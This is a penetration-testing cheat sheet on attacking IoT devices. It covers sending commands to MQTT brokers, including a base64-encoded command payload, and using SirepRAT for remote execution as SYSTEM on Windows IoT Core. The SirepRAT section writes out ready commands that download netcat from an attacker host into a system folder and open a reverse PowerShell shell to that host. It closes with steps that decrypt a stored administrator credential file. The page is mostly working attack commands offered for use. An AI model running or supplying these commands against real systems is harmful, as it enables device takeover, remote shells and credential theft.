# IoT

## Table of Contents

- [Resources](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/iot.md#Resources)
- [Mosquitto (MQTT)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/iot.md#Mosquitto-MQTT)
- [SirepRAT](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/iot.md#SirepRAT)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| MQTT-PWN | MQTT-PWN intends to be a one-stop-shop for IoT Broker penetration-testing and security assessment operations. | https://github.com/akamai-threat-research/mqtt-pwn |
| Python-based MQTT Client Shell | Python-based MQTT client command shell | https://github.com/bapowell/python-mqtt-client-shell |
| SirepRAT | Remote Command Execution as SYSTEM on Windows IoT Core (releases available for Python2.7 & Python3)  | https://github.com/SafeBreach-Labs/SirepRAT |

## Mosquitto (MQTT)

### Client Tools

```c
$ sudo apt-get install mosquitto mosquitto-clients
```

```c
$ mosquitto_sub -h <RHOST> -t U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub
$ mosquitto_pub -h <RHOST> -t XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub -m 'hello'
```

### Sending Commands

```c
{ "id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD", "arg": "ls" }
```

```c
$ mosquitto_pub -h <RHOST> -t XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub -m 'eyAiaWQiOiAiY2RkMWIxYzAtMWM0MC00YjBmLThlMjItNjFiMzU3NTQ4YjdkIiwgImNtZCI6ICJDTUQiLCAiYXJnIjogImxzIiB9'
```

### Python-based MQTT Client Shell

> https://github.com/bapowell/python-mqtt-client-shell

```c
$ python mqtt_client_shell.py
> host=<RHOST>
> host <RHOST>
> connect
> subscribe
> subscribe topic 0, 1, 2, 3
> exit
```

## SirepRAT

> https://github.com/SafeBreach-Labs/SirepRAT

### Upload

```c
$ python SirepRAT.py <RHOST> LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c powershell Invoke-Webrequest -OutFile C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe -Uri http://<LHOST>:80/nc64.exe" --v
```

### Command Execution

```c
$ python SirepRAT.py <RHOST> LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe <LHOST> <LPORT> -e powershell.exe" --v
```

```c
$ $env:UserName                                                        // get the current username
$ $credential = Import-CliXml -Path U:\Users\administrator\root.txt    // accessing a file
$ $credential.GetNetworkCredential().Password                          // show input
```
